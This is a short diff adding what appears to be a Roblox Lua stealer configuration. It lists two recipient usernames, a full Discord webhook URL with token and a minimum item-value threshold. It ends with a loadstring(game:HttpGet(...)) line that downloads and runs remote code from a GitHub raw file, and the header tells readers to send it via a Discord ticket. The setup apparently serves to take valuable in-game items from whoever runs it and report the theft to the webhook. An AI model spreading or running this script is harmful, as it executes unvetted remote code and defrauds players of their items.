@@ -1,0 +1,11 @@
+GO TO OUR DISCORD MAKE A TICKET AND SEND THIS
+
+Username = "Drink_Bubbles"
+Username2 = "Toji_mm"
+Webhook = "https://discord.com/api/webhooks/1205288252009881600/d2_dCERw12z1za2td8njKIbcUJFVUVR11NgTXIXhsd4CRD7xLJWYIHAsf-CvKEO2C3zi"
+
+LoadingScreen = true
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/egorpomidor123/premium/main/6872558a66a8029e7e80ae12.lua'))()
